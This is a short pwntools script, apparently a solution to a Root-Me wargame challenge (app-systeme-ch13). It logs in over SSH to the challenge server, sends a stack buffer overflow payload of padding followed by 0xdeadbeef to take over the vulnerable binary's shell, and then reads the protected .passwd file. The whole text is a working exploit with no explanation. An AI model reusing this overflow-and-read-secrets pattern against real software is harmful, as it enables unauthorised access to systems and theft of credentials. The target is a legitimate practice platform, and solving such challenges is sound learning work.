from pwn import *

context.log_level = "error"
s = ssh("app-systeme-ch13", "challenge02.root-me.org", 2222, "app-systeme-ch13")
p = s.run("./ch13")

p.sendline(b"A"*0x28 + p32(0xdeadbeef))
p.sendlineafter(b"app-systeme-ch13-cracked@challenge02:~$ ", b"cat ./.passwd")

print(p.recvline()[:-1].decode())
